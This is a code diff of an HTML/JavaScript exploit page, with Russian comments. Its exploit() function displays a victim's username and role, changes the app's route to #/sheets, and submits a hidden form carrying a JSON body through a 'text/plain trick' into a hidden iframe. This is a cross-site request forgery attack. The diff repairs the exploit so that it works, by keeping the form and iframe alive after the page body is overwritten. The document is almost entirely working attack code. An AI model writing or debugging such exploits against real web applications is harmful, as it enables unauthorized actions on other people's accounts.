@@ -13,9 +13,18 @@
   <script>
     function exploit(data) {
       console.log("[EXPLOIT] User data BEFORE:", data);
+
+      // Сохраняем ссылку на форму ДО изменения innerHTML
+      const form = document.getElementById('postForm');
+      const iframe = document.getElementsByName('hiddenFrame')[0];
+
       document.body.innerHTML = '<h1 style="color:red;">EXPLOIT STARTED (GUEST MODE)</h1>';
       document.body.innerHTML += '<p>Username before: ' + data.username + '</p>';
       document.body.innerHTML += '<p>Role: ' + data.role + '</p>';
+
+      // Возвращаем форму и iframe в DOM
+      document.body.appendChild(iframe);
+      document.body.appendChild(form);
 
       // Шаг 1: Переход на #/sheets
       window.location.hash = '#/sheets';
@@ -24,7 +33,7 @@
       setTimeout(() => {
         // Шаг 2: Отправляем форму с JSON через text/plain trick
         console.log("[EXPLOIT] Submitting form...");
-        document.getElementById('postForm').submit();
+        form.submit();
         document.body.innerHTML += '<p>✓ Step 2: Form submitted</p>';
 
         setTimeout(() => {
